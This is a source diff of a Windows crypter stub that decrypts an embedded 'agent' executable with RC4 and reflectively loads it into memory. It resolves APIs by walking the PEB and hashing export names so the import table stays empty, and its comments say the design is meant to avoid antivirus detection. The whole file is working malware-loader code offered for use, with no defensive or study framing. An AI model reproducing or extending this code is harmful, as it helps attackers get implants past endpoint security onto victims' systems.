@@ -1,71 +1,29 @@
 /*
  * stub_loader.c — Polymorphic stub: decrypts and reflectively loads the agent PE.
  *
- * This file is compiled as a standalone .exe. The encrypted agent bytes and
- * XOR key are #included from a generated header (stub_payload.h) that the
- * build script creates fresh for every build.
+ * This file is compiled as a standalone .exe with -nostdlib and a custom
+ * entry point (_stub_entry). There is NO CRT startup, NO standard library.
+ * The IAT is completely empty — all APIs are resolved at runtime via
+ * PEB walk + export table parsing.
  *
- * IAT is minimal (only CRT startup basics). All sensitive APIs are resolved
- * at runtime via PEB walk + export table parsing.
+ * Encryption: RC4 with key derived from a seed stored in stub_payload.h.
+ * The actual RC4 key is never stored on disk.
  *
- * Build:
- *   x86_64-w64-mingw32-gcc -Os -s -I. stub_loader.c -o agent.exe \
- *       -lkernel32 -static-libgcc -Wl,--subsystem,windows -Wl,--gc-sections
+ * Build (handled by pe_crypt.py):
+ *   x86_64-w64-mingw32-gcc -Os -s -nostdlib -Wl,-e,_stub_entry \
+ *       -Wl,--subsystem,windows stub_loader.c -o agent.exe
  */
 
 #include <windows.h>
 #include <winnt.h>
 
-/* ─── Generated per-build: encrypted payload + key ─── */
+/* ─── Generated per-build: encrypted payload + seed ─── */
 #include "stub_payload.h"
 
-/* ─── Diagnostic logging ─── */
-/*
- * Uses CRT fprintf (via msvcrt.dll, always loaded).
- * CRT functions are NOT flagged by AV — they're normal imports.
- * Only compiled when STUB_DEBUG is defined.
- */
-#ifdef STUB_DEBUG
-#include <stdio.h>
-#include <stdlib.h>
-static FILE *_log_fp = NULL;
 
-static void _log_open(void) {
-    char path[260];
-    const char *temp = getenv("TEMP");
-    if (!temp) temp = "C:\\Windows\\Temp";
-    _snprintf(path, sizeof(path), "%s\\stub_debug.log", temp);
-    _log_fp = fopen(path, "a");
-    if (_log_fp) { fprintf(_log_fp, "=== stub start ===\n"); fflush(_log_fp); }
-}
-
-static void _log_msg(const char *msg) {
-    if (!_log_fp) return;
-    fprintf(_log_fp, "%s\n", msg);
-    fflush(_log_fp);
-}
-
-static void _log_hex(const char *label, unsigned long long val) {
-    if (!_log_fp) return;
-    fprintf(_log_fp, "%s: 0x%llX\n", label, val);
-    fflush(_log_fp);
-}
-
-static void _log_close(void) {
-    if (_log_fp) { fprintf(_log_fp, "=== stub end ===\n"); fclose(_log_fp); _log_fp = NULL; }
-}
-
-#define SLOG(msg)       _log_msg(msg)
-#define SHEX(label, v)  _log_hex(label, (unsigned long long)(v))
-#else
-#define SLOG(msg)       ((void)0)
-#define SHEX(label, v)  ((void)0)
-#define _log_open()     ((void)0)
-#define _log_close()    ((void)0)
-#endif
-
-
-/* ─── PEB structures (mirrors the agent's api_resolve.c) ─── */
+/* ═══════════════════════════════════════════════════════════════════
+ * PEB structures (mirrors the agent's api_resolve.c)
+ * ═══════════════════════════════════════════════════════════════════ */
 
 typedef struct _STUB_UNICODE_STRING {
     USHORT Length;
@@ -94,7 +52,9 @@ typedef struct _STUB_LDR_DATA_TABLE_ENTRY {
 } STUB_LDR_DATA_TABLE_ENTRY;
 
 
-/* ─── Hash functions ─── */
+/* ═══════════════════════════════════════════════════════════════════
+ * Hash functions
+ * ═══════════════════════════════════════════════════════════════════ */
 
 /* DJB2 hash — case-insensitive for module names (wide char, length-limited) */
 static DWORD _hash_mod(const wchar_t *s, USHORT lenBytes) {
@@ -117,7 +77,9 @@ static DWORD _hash_func(const char *s) {
 }
 
 
-/* ─── PEB walk API resolver ─── */
+/* ═══════════════════════════════════════════════════════════════════
+ * PEB walk API resolver
+ * ═══════════════════════════════════════════════════════════════════ */
 
 /* Resolve a function from a module's export table by hash */
 static void *_resolve_export(BYTE *modBase, DWORD funcHash) {
@@ -143,7 +105,7 @@ static void *_resolve_export(BYTE *modBase, DWORD funcHash) {
     return NULL;
 }
 
-/* Walk PEB → Ldr → InMemoryOrderModuleList to find a module by hash */
+/* Walk PEB -> Ldr -> InMemoryOrderModuleList to find a module by hash */
 static BYTE *_find_module(DWORD modHash) {
     void *peb;
 #if defined(_M_X64) || defined(__x86_64__)
@@ -166,11 +128,6 @@ static BYTE *_find_module(DWORD modHash) {
     LIST_ENTRY *entry = head->Flink;
 
     while (entry != head) {
-        /*
-         * 'entry' points to InMemoryOrderLinks within the struct.
-         * Subtract sizeof(LIST_ENTRY) to get back to InLoadOrderLinks
-         * (the struct base), exactly like the agent's api_resolve.c does.
-         */
         STUB_LDR_DATA_TABLE_ENTRY *tableEntry =
             (STUB_LDR_DATA_TABLE_ENTRY *)((BYTE *)entry - sizeof(LIST_ENTRY));
 
@@ -183,8 +140,6 @@ static BYTE *_find_module(DWORD modHash) {
                 tableEntry->BaseDllName.Length
             );
 
-            SHEX("  module hash", hash);
-
             if (hash == modHash)
                 return (BYTE *)tableEntry->DllBase;
         }
@@ -195,7 +150,189 @@ static BYTE *_find_module(DWORD modHash) {
 }
 
 
-/* ─── API resolution ─── */
+/* ═══════════════════════════════════════════════════════════════════
+ * RC4 stream cipher
+ * ═══════════════════════════════════════════════════════════════════ */
+
+static void _rc4_init(unsigned char *S, const unsigned char *key, unsigned int keylen) {
+    for (int i = 0; i < 256; i++)
+        S[i] = (unsigned char)i;
+    unsigned char j = 0;
+    for (int i = 0; i < 256; i++) {
+        j = (unsigned char)(j + S[i] + key[i % keylen]);
+        unsigned char tmp = S[i];
+        S[i] = S[j];
+        S[j] = tmp;
+    }
+}
+
+static void _rc4_crypt(unsigned char *S, unsigned char *data, unsigned int datalen) {
+    unsigned char i = 0, j = 0;
+    for (unsigned int k = 0; k < datalen; k++) {
+        i = (unsigned char)(i + 1);
+        j = (unsigned char)(j + S[i]);
+        unsigned char tmp = S[i];
+        S[i] = S[j];
+        S[j] = tmp;
+        data[k] ^= S[(unsigned char)(S[i] + S[j])];
+    }
+}
+
+
+/* ═══════════════════════════════════════════════════════════════════
+ * Key derivation from seed (DJB2-based expansion)
+ * Must match _derive_key() in pe_crypt.py EXACTLY.
+ * ═══════════════════════════════════════════════════════════════════ */
+
+#define DERIVED_KEY_LEN 256
+
+static void _derive_key(const unsigned char *seed, unsigned int seedlen,
+                        unsigned char *key, unsigned int keylen) {
+    for (unsigned int i = 0; i < keylen; i += 4) {
+        unsigned int h = 5381;
+        unsigned int block = i >> 2;
+        for (unsigned int j = 0; j < seedlen; j++)
+            h = ((h << 5) + h) ^ (seed[j] + block);
+        key[i] = (unsigned char)(h & 0xFF);
+        if (i + 1 < keylen) key[i + 1] = (unsigned char)((h >> 8) & 0xFF);
+        if (i + 2 < keylen) key[i + 2] = (unsigned char)((h >> 16) & 0xFF);
+        if (i + 3 < keylen) key[i + 3] = (unsigned char)((h >> 24) & 0xFF);
+    }
+}
+
+
+/* ═══════════════════════════════════════════════════════════════════
+ * API hash constants
+ * ═══════════════════════════════════════════════════════════════════ */
+
+/* Module hashes */
+#define H_KERNEL32                  0x7040EE75
+#define H_NTDLL                     0x22D3B5ED
+
+/* Core API hashes (kernel32) */
+#define H_LoadLibraryA              0x5FBFF0FB
+#define H_GetProcAddress            0xCF31BB1F
+#define H_VirtualAlloc              0x382C0F97
+#define H_VirtualProtect            0x844FF18D
+#define H_VirtualFree               0x668FCF2E
+#define H_FlushInstructionCache     0xB7DCEDDD
+#define H_GetCurrentProcess         0xCA8D7527
+#define H_RtlAddFunctionTable       0xBDB9F1AE
+#define H_SetUnhandledExceptionFilter 0x252C3659
+#define H_TlsAlloc                  0x8BF55163
+#define H_TlsSetValue               0xC324EBA1
+#define H_ExitProcess               0xB769339E
+
+/* Debug API hashes (kernel32) — only used with STUB_DEBUG */
+#define H_CreateFileA               0xEB96C5FA
+#define H_WriteFile                 0x663CECB0
+#define H_CloseHandle               0x3870CA07
+
+
+/* ═══════════════════════════════════════════════════════════════════
+ * Debug logging via PEB-resolved APIs (NO CRT, NO stdio)
+ *
+ * All logging uses CreateFileA/WriteFile resolved from kernel32
+ * at runtime via PEB walk. Zero IAT footprint.
+ * ═══════════════════════════════════════════════════════════════════ */
+
+#ifdef STUB_DEBUG
+
+typedef HANDLE (WINAPI *fnCreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+typedef BOOL   (WINAPI *fnWriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
+typedef BOOL   (WINAPI *fnCloseHandle_t)(HANDLE);
+
+static fnCreateFileA_t  _dbg_CreateFileA  = NULL;
+static fnWriteFile_t    _dbg_WriteFile    = NULL;
+static fnCloseHandle_t  _dbg_CloseHandle  = NULL;
+static HANDLE           _dbg_hLog         = (HANDLE)-1;  /* INVALID_HANDLE_VALUE */
+
+static void _dbg_init(BYTE *k32) {
+    _dbg_CreateFileA = (fnCreateFileA_t)_resolve_export(k32, H_CreateFileA);
+    _dbg_WriteFile   = (fnWriteFile_t)  _resolve_export(k32, H_WriteFile);
+    _dbg_CloseHandle = (fnCloseHandle_t)_resolve_export(k32, H_CloseHandle);
+
+    if (!_dbg_CreateFileA || !_dbg_WriteFile) return;
+
+    /* Open log in a known location — no getenv() without CRT */
+    _dbg_hLog = _dbg_CreateFileA(
+        "C:\\Windows\\Temp\\stub_debug.log",
+        FILE_APPEND_DATA,          /* Always append */
+        FILE_SHARE_READ,
+        NULL,
+        OPEN_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+
+    if (_dbg_hLog != (HANDLE)-1) {
+        DWORD w;
+        _dbg_WriteFile(_dbg_hLog, "=== stub start ===\r\n", 20, &w, NULL);
+    }
+}
+
+static void _dbg_close(void) {
+    if (_dbg_hLog != (HANDLE)-1 && _dbg_CloseHandle) {
+        DWORD w;
+        if (_dbg_WriteFile)
+            _dbg_WriteFile(_dbg_hLog, "=== stub end ===\r\n", 18, &w, NULL);
+        _dbg_CloseHandle(_dbg_hLog);
+        _dbg_hLog = (HANDLE)-1;
+    }
+}
+
+/* String length without CRT */
+static DWORD _slen(const char *s) {
+    DWORD n = 0;
+    while (s[n]) n++;
+    return n;
+}
+
+static void _dbg_log(const char *msg) {
+    if (_dbg_hLog == (HANDLE)-1 || !_dbg_WriteFile) return;
+    DWORD w;
+    _dbg_WriteFile(_dbg_hLog, msg, _slen(msg), &w, NULL);
+    _dbg_WriteFile(_dbg_hLog, "\r\n", 2, &w, NULL);
+}
+
+static void _dbg_hex(const char *label, unsigned long long val) {
+    if (_dbg_hLog == (HANDLE)-1 || !_dbg_WriteFile) return;
+    /* Manual hex formatting — no sprintf without CRT */
+    static const char hx[] = "0123456789ABCDEF";
+    char buf[64];
+    DWORD pos = 0;
+
+    /* Copy label */
+    while (*label && pos < 40) buf[pos++] = *label++;
+    buf[pos++] = ':'; buf[pos++] = ' ';
+    buf[pos++] = '0'; buf[pos++] = 'x';
+
+    /* Convert value to hex (skip leading zeros) */
+    int started = 0;
+    for (int i = 60; i >= 0; i -= 4) {
+        int nibble = (int)((val >> i) & 0xF);
+        if (nibble || started || i == 0) {
+            buf[pos++] = hx[nibble];
+            started = 1;
+        }
+    }
+
+    DWORD w;
+    _dbg_WriteFile(_dbg_hLog, buf, pos, &w, NULL);
+    _dbg_WriteFile(_dbg_hLog, "\r\n", 2, &w, NULL);
+}
+
+#define SLOG(msg)       _dbg_log(msg)
+#define SHEX(label, v)  _dbg_hex(label, (unsigned long long)(v))
+#else
+#define SLOG(msg)       ((void)0)
+#define SHEX(label, v)  ((void)0)
+#endif
+
+
+/* ═══════════════════════════════════════════════════════════════════
+ * Resolved API function pointer table
+ * ═══════════════════════════════════════════════════════════════════ */
 
 typedef HMODULE (WINAPI *fnLoadLibraryA_t)(LPCSTR);
 typedef FARPROC (WINAPI *fnGetProcAddress_t)(HMODULE, LPCSTR);
@@ -207,6 +344,7 @@ typedef HANDLE  (WINAPI *fnGetCurrentProcess_t)(void);
 typedef LPTOP_LEVEL_EXCEPTION_FILTER (WINAPI *fnSetUnhandledExceptionFilter_t)(LPTOP_LEVEL_EXCEPTION_FILTER);
 typedef DWORD   (WINAPI *fnTlsAlloc_t)(void);
 typedef BOOL    (WINAPI *fnTlsSetValue_t)(DWORD, LPVOID);
+typedef void    (WINAPI *fnExitProcess_t)(UINT);
 
 #if defined(_M_X64) || defined(__x86_64__)
 typedef BOOLEAN (WINAPI *fnRtlAddFunctionTable_t)(PRUNTIME_FUNCTION, DWORD, DWORD64);
@@ -223,25 +361,12 @@ typedef struct {
     fnSetUnhandledExceptionFilter_t pSetUnhandledExceptionFilter;
     fnTlsAlloc_t             pTlsAlloc;
     fnTlsSetValue_t          pTlsSetValue;
+    fnExitProcess_t          pExitProcess;
 #if defined(_M_X64) || defined(__x86_64__)
     fnRtlAddFunctionTable_t  pRtlAddFunctionTable;
 #endif
 } RESOLVED_APIS;
 
-/* Hash constants — same as agent's api_resolve.h */
-#define H_KERNEL32              0x7040EE75
-#define H_NTDLL                 0x22D3B5ED
-#define H_LoadLibraryA          0x5FBFF0FB
-#define H_GetProcAddress        0xCF31BB1F
-#define H_VirtualAlloc          0x382C0F97
-#define H_VirtualProtect        0x844FF18D
-#define H_VirtualFree           0x668FCF2E
-#define H_FlushInstructionCache 0xB7DCEDDD
-#define H_GetCurrentProcess     0xCA8D7527
-#define H_RtlAddFunctionTable   0xBDB9F1AE
-#define H_SetUnhandledExceptionFilter 0x252C3659
-#define H_TlsAlloc              0x8BF55163
-#define H_TlsSetValue           0xC324EBA1
 
 static BOOL _resolve_apis(RESOLVED_APIS *api) {
     SLOG("[stub] finding kernel32...");
@@ -252,7 +377,13 @@ static BOOL _resolve_apis(RESOLVED_APIS *api) {
         return FALSE;
     }
 
-    SHEX("[stub] kernel32 base", (unsigned long long)(ULONG_PTR)k32);
+    SHEX("[stub] kernel32 base", (ULONG_PTR)k32);
+
+    /* Initialize debug logging FIRST so we can log subsequent steps */
+#ifdef STUB_DEBUG
+    _dbg_init(k32);
+    SLOG("[stub] debug logging initialized");
+#endif
 
     api->pLoadLibraryA       = (fnLoadLibraryA_t)      _resolve_export(k32, H_LoadLibraryA);
     api->pGetProcAddress     = (fnGetProcAddress_t)     _resolve_export(k32, H_GetProcAddress);
@@ -261,6 +392,7 @@ static BOOL _resolve_apis(RESOLVED_APIS *api) {
     api->pVirtualFree        = (fnVirtualFree_t)        _resolve_export(k32, H_VirtualFree);
     api->pFlushInstructionCache = (fnFlushInstructionCache_t)_resolve_export(k32, H_FlushInstructionCache);
     api->pGetCurrentProcess  = (fnGetCurrentProcess_t)  _resolve_export(k32, H_GetCurrentProcess);
+    api->pExitProcess        = (fnExitProcess_t)        _resolve_export(k32, H_ExitProcess);
 
     api->pSetUnhandledExceptionFilter = (fnSetUnhandledExceptionFilter_t)_resolve_export(k32, H_SetUnhandledExceptionFilter);
     api->pTlsAlloc    = (fnTlsAlloc_t)   _resolve_export(k32, H_TlsAlloc);
@@ -279,16 +411,19 @@ static BOOL _resolve_apis(RESOLVED_APIS *api) {
 #endif
 
     BOOL ok = (api->pLoadLibraryA && api->pGetProcAddress &&
-               api->pVirtualAlloc && api->pVirtualProtect);
+               api->pVirtualAlloc && api->pVirtualProtect &&
+               api->pExitProcess);
     SLOG(ok ? "[stub] all APIs OK" : "[stub] FAIL: missing critical API");
     return ok;
 }
 
 
-/* ─── Crash handler (debug builds) ─── */
+/* ═══════════════════════════════════════════════════════════════════
+ * Crash handler (debug builds)
+ * ═══════════════════════════════════════════════════════════════════ */
+
 #ifdef STUB_DEBUG
 static LONG WINAPI _stub_exception_handler(EXCEPTION_POINTERS *ep) {
-    _log_open();  /* re-open in case it was closed */
     SLOG("[stub] !!! UNHANDLED EXCEPTION !!!");
     if (ep && ep->ExceptionRecord) {
         SHEX("[stub] exception code", ep->ExceptionRecord->ExceptionCode);
@@ -303,12 +438,15 @@ static LONG WINAPI _stub_exception_handler(EXCEPTION_POINTERS *ep) {
         SHEX("[stub] RDX", ep->ContextRecord->Rdx);
 #endif
     }
-    _log_close();
+    _dbg_close();
     return EXCEPTION_CONTINUE_SEARCH;
 }
 #endif
 
-/* ─── Reflective PE Loader ─── */
+
+/* ═══════════════════════════════════════════════════════════════════
+ * Reflective PE Loader
+ * ═══════════════════════════════════════════════════════════════════ */
 
 typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
 
@@ -467,8 +605,8 @@ static void _process_tls(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *api) {
     }
 }
 
-static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
-    SLOG("[stub] load_pe_and_run enter");
+static BOOL _load_pe(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
+    SLOG("[stub] _load_pe enter");
 
     IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)rawPE;
     if (dos->e_magic != IMAGE_DOS_SIGNATURE) { SLOG("[stub] FAIL: bad MZ"); return FALSE; }
@@ -592,41 +730,76 @@ static BOOL load_pe_and_run(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
 }
 
 
-/* ─── Entry Point ─── */
+/* ═══════════════════════════════════════════════════════════════════
+ * Entry point — NO CRT, ZERO IAT imports
+ *
+ * Linked with -nostdlib -Wl,-e,_stub_entry
+ * This function IS the process entry point. No WinMainCRTStartup,
+ * no GetModuleHandleA, no GetProcAddress in the IAT.
+ * ═══════════════════════════════════════════════════════════════════ */
 
-int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
-    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
-
-    _log_open();
-    SLOG("[stub] WinMain entered");
+void _stub_entry(void) {
 
     /* Phase 1: Resolve APIs via PEB walk */
     RESOLVED_APIS api;
-    if (!_resolve_apis(&api)) {
-        SLOG("[stub] FATAL: API resolution failed");
-        _log_close();
-        return 1;
+    /* Zero-init without memset (no CRT) */
+    {
+        BYTE *p = (BYTE *)&api;
+        for (unsigned int i = 0; i < sizeof(api); i++) p[i] = 0;
     }
 
-    /* Phase 2: Decrypt payload */
-    SLOG("[stub] decrypting...");
-    for (DWORD i = 0; i < PAYLOAD_SIZE; i++)
-        g_enc_payload[i] ^= g_xor_key[i % KEY_SIZE];
+    if (!_resolve_apis(&api)) {
+        SLOG("[stub] FATAL: API resolution failed");
+#ifdef STUB_DEBUG
+        _dbg_close();
+#endif
+        /* Can't call ExitProcess — it wasn't resolved. Just return. */
+        return;
+    }
 
-    if (g_enc_payload[0] != 'M' || g_enc_payload[1] != 'Z') {
+    /* Phase 2: Derive RC4 key from seed */
+    SLOG("[stub] deriving key...");
+    unsigned char rc4_key[DERIVED_KEY_LEN];
+    _derive_key(g_res_cfg, RES_CFG_SIZE, rc4_key, DERIVED_KEY_LEN);
+
+    /* Phase 3: RC4 decrypt payload */
+    SLOG("[stub] decrypting...");
+    {
+        unsigned char S[256];
+        _rc4_init(S, rc4_key, DERIVED_KEY_LEN);
+        _rc4_crypt(S, g_res_data, RES_DATA_SIZE);
+    }
+
+    /* Wipe key from stack */
+    {
+        volatile unsigned char *p = rc4_key;
+        for (int i = 0; i < DERIVED_KEY_LEN; i++) p[i] = 0;
+    }
+
+    /* Verify decryption (check MZ header) */
+    if (g_res_data[0] != 'M' || g_res_data[1] != 'Z') {
         SLOG("[stub] FATAL: bad MZ after decrypt");
-        _log_close();
-        return 1;
+#ifdef STUB_DEBUG
+        _dbg_close();
+#endif
+        api.pExitProcess(1);
+        return;  /* unreachable, but satisfies compiler */
     }
     SLOG("[stub] decrypt OK");
 
-    /* Phase 3: Load and execute */
-    if (!load_pe_and_run(g_enc_payload, PAYLOAD_SIZE, &api)) {
+    /* Phase 4: Load and execute */
+    if (!_load_pe(g_res_data, RES_DATA_SIZE, &api)) {
         SLOG("[stub] FATAL: load failed");
-        _log_close();
-        return 1;
+#ifdef STUB_DEBUG
+        _dbg_close();
+#endif
+        api.pExitProcess(1);
+        return;
     }
 
-    _log_close();
-    return 0;
+#ifdef STUB_DEBUG
+    _dbg_close();
+#endif
+    /* Agent's main() has returned — exit cleanly */
+    api.pExitProcess(0);
 }
